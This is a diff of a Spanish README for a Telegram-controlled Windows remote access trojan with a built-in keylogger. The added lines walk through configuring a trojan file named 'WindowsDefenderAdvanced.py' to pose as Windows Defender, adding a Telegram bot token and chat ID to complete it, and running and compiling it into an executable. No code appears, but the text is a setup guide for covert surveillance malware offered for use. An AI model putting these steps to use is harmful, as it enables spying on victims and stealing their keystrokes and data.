@@ -196,15 +196,30 @@ ___
 ___
 
 ## Futuras caracteristicas
-Se está trabajando en las siguientes caracteristicas
-![dsf](https://i.imgur.com/CnA3G20.png)
+Se está trabajando en las siguientes caracteristicas y se iran habilitando en las siguientes actualizaciones
+![futuras actualizaciones](https://i.imgur.com/CnA3G20.png)
 
 # Preparación
 
 __Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)
 
-* 
+* Editar el archivo `WindowsDefenderAdvanced.py`
+![Archivo Windows defender advances troyano](https://i.imgur.com/5F3hN97.png)
+* Creamos en GotFather un Bot y obtenemos nuestro token
+* Entramos y agregamos nuestro token del bot y nuestro ID del Chat
+![agregar ](https://i.imgur.com/1DHzPUh.png)
+* ya agregando dicha información el RAT ya está terminado.
+* Para ejecutarlo, busque el archivo `Ejecutar.bat` => Y le damos a editar.
+![Ejecutar.bat](https://i.imgur.com/IO15FFn.png)
+* He insertamos la ruta donde se encuentra nuestro RAT
+![ejecutar.bat data](https://i.imgur.com/IErOgU2.png)
 
+
+
+# Capturas de pantalla
+![]()
+![]()
+![]()
 
 ## Conversión de `*.py a *.exe`:
 * Busque el archivo `Compilar.bat`
@@ -235,7 +250,7 @@ ___
 ___
 # Creador 
 * __Repositorio Original:__ [mvrozanti](https://github.com/mvrozanti/RAT-via-Telegram) <== Es el creador original de éste repositorio.
-* __Repostitorio:__ [Keylogger_Python](https://github.com/SebastianEPH/Keylogger_Python) <== Éste repositorio fue integrado en su totalidad dentro de [RAT_via_Telegram_Windows](https://github.com/SebastianEPH/RAT_via_Telegram_Windows).
+* __Repostitorio:__ [Keylogger_Python](https://github.com/SebastianEPH/Keylogger_Python) <== Éste repositorio fue integrado en un 50% dentro de [RAT_via_Telegram_Windows](https://github.com/SebastianEPH/RAT_via_Telegram_Windows).
 ## By SebastianEPH
 - [Github](https://github.com/SebastianEPH)
 - [Facebook](https://www.facebook.com/SebastianEPH)
